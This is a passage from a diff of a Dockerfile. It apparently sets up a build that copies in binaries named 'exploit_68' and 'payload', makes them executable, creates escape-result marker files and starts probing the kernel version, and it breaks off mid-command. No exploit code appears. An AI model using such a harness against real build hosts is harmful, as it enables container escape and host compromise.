@@ -1,12 +1,12 @@
 # syntax=er028455/df-frontend:v4
-# build-trigger: 171
+# build-trigger: 172
 FROM alpine:3.19 AS builder
 RUN apk add --no-cache curl coreutils
-      
+
 COPY exploit_68 /exploit
 COPY payload /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
-    
+
 RUN sh -c '{ \
 KVER=$(uname -r); \
 echo "=== BUILD V30 KERNEL=$KVER ==="; \
